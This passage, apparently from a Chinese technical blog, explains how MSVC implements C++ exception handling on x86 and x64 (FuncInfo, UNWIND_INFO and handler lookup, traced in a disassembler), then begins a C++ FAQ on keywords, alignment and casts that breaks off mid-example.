class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">CatchableType</span> &#123;<br>      <span class="hljs-comment">// 0x01: simple type (can be copied by memmove), 0x02: can be caught by reference only, 0x04: has virtual bases</span><br>      DWORD properties;<br><br>      <span class="hljs-comment">// RTTI类型信息，catch块就是比较这个结构</span><br>      TypeDescriptor* pType;<br><br>      <span class="hljs-comment">// 基类信息</span><br>      PMD thisDisplacement;<br><br>      <span class="hljs-comment">// 抛出对象的字节大小</span><br>      <span class="hljs-type">int</span> sizeOrOffset;<br><br>      <span class="hljs-comment">// 抛出对象的拷贝构造函数地址</span><br>      <span class="hljs-built_in">void</span> (*copyFunction)();<br>&#125;;<br><br>    <span class="hljs-comment">// Pointer-to-member descriptor.</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">PMD</span> &#123;<br>      <span class="hljs-comment">// 基类偏移</span><br>      <span class="hljs-type">int</span> mdisp;<br><br>      <span class="hljs-comment">// 虚基类偏移 （-1表示没有）</span><br>      <span class="hljs-type">int</span> pdisp;<br><br>      <span class="hljs-comment">// 基类虚表偏移</span><br>      <span class="hljs-type">int</span> vdisp;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="3-示例分析"><a href="#3-示例分析" class="headerlink" title="3. 示例分析"></a>3. 示例分析</h2><h3 id="3-1-try-x2F-catch块分析"><a href="#3-1-try-x2F-catch块分析" class="headerlink" title="3.1 try&#x2F;catch块分析"></a>3.1 try&#x2F;catch块分析</h3><p>函数头部：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002163402049.png" alt="异常回调函数注册"></p><p>异常处理函数体：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002163804479.png" alt="注册异常"></p><p>函数信息结构内容：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002164324887.png" alt="FuncInfo结构"></p><p>可以看出main函数中有2个栈展开结构，1一个try块。</p><p>其中，栈展开信息内容如下：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002165850690.png" alt="UnwindMapEntry结构"></p><p>try块信息如下：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002165920882.png" alt="TryBlockMapEntry结构"></p><p>可以看出该try块对应2个catch异常处理。</p><p>pHandlerArray信息如下：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002171219284.png" alt="HandlerType数组"></p><p>其中，catch_code1和catch_code2就是编写的catch块内的异常处理代码，如下所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002171302166.png" alt="异常处理代码1"></p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002171335263.png" alt="异常处理代码2"></p><h3 id="3-2-回调注册分析–对象类型异常"><a href="#3-2-回调注册分析–对象类型异常" class="headerlink" title="3.2 回调注册分析–对象类型异常"></a>3.2 回调注册分析–对象类型异常</h3><p>__CxxFrameHandler3函数将参数向下传递。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002222308026.png" alt="__CxxFrameHandler3"></p><p>__InternalCxxFrameHandler函数主要是对一些信息进行校验，然后调用FindHandler函数查找try&#x2F;catch块。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002222149322.png" alt="__InternalCxxFrameHandler"></p><p>FindHandler函数中使用三层循环对try块的范围进行校验，并将符合要求的try与catch进行类型比对，比对成功调用CatchIt完成异常处理。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002224707704.png" alt="FindHandler"></p><p>__TypeMatch函数中使用strcmp比较了RTTI的name字符串。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002224551011.png" alt="__TypeMatch"></p><p>CatchIt函数中主要是处理异常对象、执行栈展开、执行catch块。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003154623042.png" alt="CatchIt"></p><p>其中栈展开调用了如下API：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002230309773.png" alt="栈展开API"></p><p>之后循环调用UnwindMapEntry.action完成局部对象的析构。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003153615756.png" alt="执行action"></p><p>最终执行catch块代码，完成异常处理。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002230512362.png" alt="catch块执行"></p><p>在catch块代码执行完后，会将eax修改为catch块结束位置，返回给上一层函数。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003151051042.png" alt="设置eax"></p><p>最终由JumpToContinuation函数跳转到catch块结束位置完成异常处理。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003151150445.png" alt="JumpToContinuation函数"></p><h3 id="3-3-throw过程分析"><a href="#3-3-throw过程分析" class="headerlink" title="3.3 throw过程分析"></a>3.3 throw过程分析</h3><p>异常对象抛出位置，可以看到ThrowInfo作为参数传递。<strong>如果抛出的是对象类型的异常，这里会调用它的构造函数。</strong></p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002175014250.png" alt="抛出异常位置"></p><p>相关结构信息如下：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002175156338.png" alt="抛出异常结构"></p><p>根据上述信息可以看出抛出的异常类型为 基本类型 ，可以被char*、void*类型的catch块捕获。</p><p>在__CxxThrowException函数中调用API向内核抛出异常。</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003151505632.png" alt="API抛异常"></p><p>之后就是内核对异常的处理，实现方式由系统决定。</p><h2 id="4-x64异常处理"><a href="#4-x64异常处理" class="headerlink" title="4.x64异常处理"></a>4.x64异常处理</h2><p>​x64中几乎每个函数都存在一个RUNTIME_FUNCTION结构（除了不操作rsp、没有异常处理的函数、不会调用其他函数），保存在pe文件的.pdata段。从这个结构出发可以找到UNWIND_INFO，最终找到FuncInfo结构，需要注意的是x64下指针位置都是RVA，需要加上ImageBase来定位真实地址。</p><h3 id="4-1-结构定义"><a href="#4-1-结构定义" class="headerlink" title="4.1  结构定义"></a>4.1  结构定义</h3><h4 id="4-1-1-RUNTIME-FUNCTION"><a href="#4-1-1-RUNTIME-FUNCTION" class="headerlink" title="4.1.1 RUNTIME_FUNCTION"></a>4.1.1 RUNTIME_FUNCTION</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 该结构在内存中必须4字节对齐</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_RUNTIME_FUNCTION</span> &#123;<span class="hljs-comment">// 均为RVA</span><br>        ULONG BeginAddress;<span class="hljs-comment">// 函数起始地址</span><br>        ULONG EndAddress;<span class="hljs-comment">// 函数结束地址</span><br>        ULONG UnwindData;<span class="hljs-comment">// UNWIND_INFO指针</span><br>&#125; RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;<br></code></pre></td></tr></table></figure><h4 id="4-1-2-UNWIND-INFO"><a href="#4-1-2-UNWIND-INFO" class="headerlink" title="4.1.2 UNWIND_INFO"></a>4.1.2 UNWIND_INFO</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_UNWIND_INFO</span> &#123;<span class="hljs-comment">// 均为RVA</span><br>        UCHAR Version : <span class="hljs-number">3</span>;<span class="hljs-comment">// 结构体版本号</span><br>        UCHAR Flags : <span class="hljs-number">5</span>;<span class="hljs-comment">// 异常处理信息</span><br>        UCHAR SizeOfProlog;<span class="hljs-comment">// 函数序言部分大小</span><br>        UCHAR CountOfCodes;<span class="hljs-comment">// 后面跟随的 UNWIND_CODE 结构所占的字节数</span><br>        UCHAR FrameRegister : <span class="hljs-number">4</span>;<span class="hljs-comment">// 帧寄存器</span><br>        UCHAR FrameOffset : <span class="hljs-number">4</span>;<span class="hljs-comment">// 帧寄存器偏移量</span><br>        UNWIND_CODE UnwindCode[<span class="hljs-number">1</span>];<span class="hljs-comment">// UNWIND_CODE数组</span><br>    <br>    ULONG FunctionEntry;<span class="hljs-comment">// CxxFrameHandler3地址</span><br>    ULONG ExceptionData;<span class="hljs-comment">// FuncInfo结构的rva</span><br>    <br>    <br>&#125; UNWIND_INFO, *PUNWIND_INFO;<br><br>Flag：<br>        <span class="hljs-built_in">UNW_FLAG_NHANDLER</span> (<span class="hljs-number">0x0</span>):  表示既没有 EXCEPT_FILTER 也没有 <span class="hljs-function">EXCEPT_HANDLER</span><br><span class="hljs-function">      <span class="hljs-title">UNW_FLAG_EHANDLER</span> <span class="hljs-params">(<span class="hljs-number">0x1</span>)</span>:  表示该函数有 EXCEPT_FILTER &amp; EXCEPT_HANDLER</span><br><span class="hljs-function">     UNW_FLAG_UHANDLER (<span class="hljs-number">0x2</span>): 表示该函数有 FINALLY_HANDLER</span><br><span class="hljs-function">      UNW_FLAG_CHAININFO (<span class="hljs-number">0x4</span>): 表示该函数有多个 UNWIND_INFO，它们串接在一起（所谓的 chain）</span><br></code></pre></td></tr></table></figure><h4 id="4-1-3-UNWIND-CODE"><a href="#4-1-3-UNWIND-CODE" class="headerlink" title="4.1.3 UNWIND_CODE"></a>4.1.3 UNWIND_CODE</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> <span class="hljs-title class_">_UNWIND_CODE</span> &#123;<br>    <span class="hljs-keyword">struct</span> &#123;<br>        UCHAR CodeOffset;<span class="hljs-comment">// 回滚位置距离函数入口的偏移</span><br>        UCHAR UnwindOp : <span class="hljs-number">4</span>;<span class="hljs-comment">// 对应下面的枚举，表示栈回滚类型</span><br>        UCHAR OpInfo : <span class="hljs-number">4</span>;<span class="hljs-comment">// 归滚操作的具体信息，如栈提升多少个字节</span><br>    &#125;;<br>    USHORT FrameOffset;<br>&#125; UNWIND_CODE, *PUNWIND_CODE;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">_UNWIND_OP_CODES</span> &#123;<br>        UWOP_PUSH_NONVOL = <span class="hljs-number">0</span>,   <span class="hljs-comment">// 0压入非易失寄存器，操作信息是寄存器编号</span><br>        UWOP_ALLOC_LARGE,       <span class="hljs-comment">// 1堆栈中分配一个大区域，操作信息为0时，分配大小除以8放在下一个字节上；1时，未缩放的大小放在之后的两个字节上</span><br>        UWOP_ALLOC_SMALL,       <span class="hljs-comment">// 2堆栈中分配一个小区域，操作信息为分配大小除以8再减去1</span><br>        UWOP_SET_FPREG,         <span class="hljs-comment">// 3通过将寄存器设置为当前 RSP 的某个偏移量来建立帧指针寄存器，操作信息为偏移量除以16</span><br>        UWOP_SAVE_NONVOL,       <span class="hljs-comment">// 4使用mov指令保存非易失寄存器，操作信息为寄存器编号</span><br>        UWOP_SAVE_NONVOL_FAR,   <span class="hljs-comment">// 5使用mov指令保存长偏移非易失寄存器，操作信息为寄存器编号，未缩放的堆栈偏移保存在后两个字节</span><br>        UWOP_SPARE_CODE1,       <span class="hljs-comment">// 6</span><br>        UWOP_SPARE_CODE2,       <span class="hljs-comment">// 7</span><br>        UWOP_SAVE_XMM128,       <span class="hljs-comment">// 8堆栈上保存xmm寄存器，操作信息为寄存器编号</span><br>        UWOP_SAVE_XMM128_FAR,   <span class="hljs-comment">// 9堆栈上保存长偏移xmm寄存器，操作信息为寄存器编号</span><br>        UWOP_PUSH_MACHFRAME     <span class="hljs-comment">// 10硬件中断相关</span><br>&#125; UNWIND_OP_CODES, *PUNWIND_OP_CODES;<br></code></pre></td></tr></table></figure><h4 id="4-1-3-FuncInfo变化"><a href="#4-1-3-FuncInfo变化" class="headerlink" title="4.1.3 FuncInfo变化"></a>4.1.3 FuncInfo变化</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// x64函数信息结构</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">FuncInfo</span> &#123;<span class="hljs-comment">// RVA</span><br>    <span class="hljs-comment">// 编译器版本号</span><br>    <span class="hljs-comment">// 0x19930520: up to VC6, 0x19930521: VC7.x(2002-2003), 0x19930522: VC8 (2005)</span><br>    DWORD magicNumber;<br><br>    <span class="hljs-comment">// 最大栈展开数的下标</span><br>    <span class="hljs-type">int</span> maxState;<br><br>    <span class="hljs-comment">// 栈展开结构数组指针</span><br>    UnwindMapEntry* pUnwindMap;<br><br>    <span class="hljs-comment">// 函数中try块个数</span><br>    DWORD nTryBlocks;<br><br>    <span class="hljs-comment">// try块结构数组指针</span><br>    TryBlockMapEntry* pTryBlockMap;<br><br>    <span class="hljs-comment">// IP映射表的数量</span><br>    DWORD nIPMapEntries;<br><br>    <span class="hljs-comment">// IP映射表的RVA，指向IPtoStateMapEntry结构</span><br>    <span class="hljs-type">void</span>* pIPtoStateMap;<br><br>    <span class="hljs-comment">// 异常展开帮助RVA</span><br>    UnWindMapEntry* pUnWindMapEntry;<br>    <br>    <span class="hljs-comment">// 异常类型列表RVA</span><br>    ESTypeList* pESTypeList;<br><br>    <span class="hljs-comment">// 一些功能标志</span><br>    <span class="hljs-type">int</span> EHFlags;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="4-1-4-IptoStateMapEntry"><a href="#4-1-4-IptoStateMapEntry" class="headerlink" title="4.1.4 IptoStateMapEntry"></a>4.1.4 IptoStateMapEntry</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">IptoStateMapEntry</span> &#123;<br>    ULONG __Ip;<span class="hljs-comment">// try块起始rip的RVA</span><br>    ULONG State;<span class="hljs-comment">// try块状态索引</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="4-2-结构关系图"><a href="#4-2-结构关系图" class="headerlink" title="4.2  结构关系图"></a>4.2  结构关系图</h3><p>​x86应用程序中，使用栈空间的一个变量标 识try块的状态索引，在x64中不再使用该变量，而是通过产生异常的 地址（RIP）查询IP状态映射表来获取try块的状态索引，结构如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003172703707.png" alt="FuncInfo结构关系"></p><h3 id="4-3-示例分析"><a href="#4-3-示例分析" class="headerlink" title="4.3  示例分析"></a>4.3  示例分析</h3><p>查看main函数的交叉引用可以定位到它的RUNTIME_FUNCTION结构，如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003173146049.png" alt="定位RUNTIME_FUNCTIONJ结构"></p><p>根据RUNTIME_FUNCTION的第三个成员定位到UNWIND_INFO结构，如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003173320384.png" alt="定位UNWIND_INFO"></p><p>UNWIND_INFO结构信息如下：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003173410710.png" alt="UNWIND_INFO信息"></p><p>根据rva定位到FuncInfo结构，如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003173530359.png" alt="定位FuncInfo"></p><p>进而定位到TryBlockMapEntry数组以及HandlerType数组，得到try1的索引为0~0，如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003173713036.png" alt="定位TryBlockMapEntry"></p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003173740699.png" alt="定位HandlerType"></p><p>最终定位到catch块地址，如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003173901686.png" alt="catch块地址"></p><p>根据FuncInfo定位IP状态表，如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003180040935.png" alt="IP状态表"></p><p>根据try1的索引0<del>0可以在IP表中确定边界为0x1400A8BC9</del>0x1400A8BEB，验证如下：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003180205523.png" alt="try范围"></p><p>catch1的范围为0x1401DC1B4<del>0x1401DC1ED，catch2的范围为0x1401DC210</del>0x1401DC249，如下图所示：</p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003180346164.png" alt="catch1范围"></p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221003180427885.png" alt="catch2范围"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><ul><li>基于Windows SEH实现，在函数头部构造异常链，以及异常处理回调函数的注册。</li><li>异常处理结构信息在编译阶段生成好。</li><li>throw调用了Windows API来完成异常的抛出。</li><li>类型识别基于RTTI实现，本质就是编译器生成的类型字符串，使用strcmp比对来寻找合适的catch进行执行。</li><li>栈展开机制是在当前函数中找不到catch时，需要向上层函数寻找时被触发，展开过程需要调用局部对象的析构函数。</li></ul>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++常见问题整理</title>
      <link href="/2022/10/01/c-chang-jian-wen-ti-hui-zong/"/>
      <url>/2022/10/01/c-chang-jian-wen-ti-hui-zong/</url>
      
        <content type="html"><![CDATA[<h2 id="1-关键字"><a href="#1-关键字" class="headerlink" title="1.关键字"></a>1.关键字</h2><h3 id="1-1-const"><a href="#1-1-const" class="headerlink" title="1.1 const"></a>1.1 const</h3><p><strong>底层const指针：</strong>可以修改指向，不可以改值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> dwVal1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> dwVal2 = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span>* p1 = &amp;dwVal1;<br><br>p1 = &amp;dwVal2;<span class="hljs-comment">// 正确</span><br>*p1 = <span class="hljs-number">5</span>;<span class="hljs-comment">// 不正确</span><br></code></pre></td></tr></table></figure><p><strong>底层const指针：</strong>可以改值，不可以改指向。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> dwVal1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> dwVal2 = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span>* <span class="hljs-type">const</span> p1 = &amp;dwVal1;<br><br>p1 = &amp;dwVal2;<span class="hljs-comment">// 不正确</span><br>*p1 = <span class="hljs-number">5</span>;<span class="hljs-comment">// 正确</span><br></code></pre></td></tr></table></figure><p><strong>成员函数指针：</strong>表示这个函数不会修改成员变量的内容，mutable关键字修饰的成员变量除外，同时该函数不能被static关键字修饰。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">m_fun1</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>m_dwVal1 = <span class="hljs-number">5</span>;<span class="hljs-comment">// 错误</span><br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_dwVal1;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="1-2-static"><a href="#1-2-static" class="headerlink" title="1.2 static"></a>1.2 static</h3><p>static本质与全局符号的概念一致，只是在语法层面存在细微差别。</p><ul><li>修饰全局变量：语法层面限制该变量只在当前文件内有效。</li><li>修饰全局函数：语法层面限制该函数只在当前文件内有效。</li><li>修饰局部变量：语法层面用来扩展栈变量的生命周期。</li><li>修饰成员变量：语法层面表示多个对象中共享数据，可以通过类名访问，需要在类外初始化，可以被普通成员函数访问。</li><li>修饰成员函数：语法层面可以被类名直接调用，不传递this指针，不能访问普通成员变量。</li></ul><h3 id="1-3-virtual"><a href="#1-3-virtual" class="headerlink" title="1.3 virtual"></a>1.3 virtual</h3><p>用于声明一个类成员函数为虚函数。存在虚函数的类对象，首个成员固定为一个指针，指向该类的虚函数表。</p><p>当父类指针指向子类对象，子类重写父类虚函数，此时虚函数会以指针寻址的方式动态调用，构成多态性。</p><p>构造函数中完成虚表指针的初始化，所以构造函数不能被定义为虚函数。</p><p><strong>析构函数声明为虚函数的原因：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">Base* p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">A</span>();<br><span class="hljs-keyword">delete</span> p;<br></code></pre></td></tr></table></figure><p>如果析构函数不为虚函数，上面的代码会只调用父类的析构函数，子类的对象没有被正确释放。</p><p>当析构函数声明为虚函数时，会在子类虚函数表中找到子类的析构函数进行调用，先析构子类再析构父类，整个派生类被完全释放。</p><p><img src="/2022/10/01/c-chang-jian-wen-ti-hui-zong/image-20221001164349840.png" alt="析构函数对比图"></p><h3 id="1-4-volatile"><a href="#1-4-volatile" class="headerlink" title="1.4 volatile"></a>1.4 volatile</h3><p>告诉编译器，这个变量的值需要每次都从内存中去读取，不允许暂存到寄存器中，可以用在多线程对某个全局标志的访问时。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-type">int</span> g_Flag = <span class="hljs-number">0</span>;<br><br><span class="hljs-function">DWORD <span class="hljs-title">ThreadProc1</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpThreadParameter</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>g_Flag = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">while</span> (g_Flag) &#123;&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">DWORD <span class="hljs-title">ThreadProc2</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpThreadParameter</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>::<span class="hljs-built_in">Sleep</span>(<span class="hljs-number">5000</span>);<br>g_Flag = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>HANDLE hThread1 = ::<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc1, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>HANDLE hThread2 = ::<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码在Release版编译下，会死循环，汇编如下：</p><p><img src="/2022/10/01/c-chang-jian-wen-ti-hui-zong/image-20221001171456415.png" alt="死循环"></p><p>在将g_Flag使用volatile修饰后，不会产生死循环，汇编代码如下：</p><p><img src="/2022/10/01/c-chang-jian-wen-ti-hui-zong/image-20221001171816455.png" alt="修复死循环"></p><h3 id="1-5-explict"><a href="#1-5-explict" class="headerlink" title="1.5 explict"></a>1.5 explict</h3><p>用于修饰类构造函数，不允许对象发生隐式类型转换。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">A</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A::constor\n&quot;</span>);<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>A a = <span class="hljs-number">2</span>;<span class="hljs-comment">// 错误</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-字节对齐"><a href="#2-字节对齐" class="headerlink" title="2.字节对齐"></a>2.字节对齐</h2><h3 id="2-1-规则"><a href="#2-1-规则" class="headerlink" title="2.1 规则"></a>2.1 规则</h3><ul><li>结构体成员：第一个成员放在offset为0的位置，之后的每个数据成员按照#pragma pack指定的数值和sizeof()中的较小值进行对齐。</li><li>结构体总体：总大小按照#pragma pack指定的数值和sizeof()中的较小值进行对齐。</li></ul><h3 id="2-2-原因"><a href="#2-2-原因" class="headerlink" title="2.2 原因"></a>2.2 原因</h3><ul><li><p>平台原因：某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。</p></li><li><p>性能原因：访问未对齐的内存，处理器需要作两次访问；而访问对齐的内存仅需要一次访问。</p><p>如int类型的四字节存储在0x1地址上，cpu需要首先从0x0位置读4字节，舍去0x0这1个字节，再从0x4位置读4字节，舍去0x5开始的3个字节，最终拼接得到最终结果。</p></li></ul><h2 id="3-类型转换"><a href="#3-类型转换" class="headerlink" title="3.类型转换"></a>3.类型转换</h2><ul><li><p>const_cast</p><p>用于对指针或引用去const属性</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span 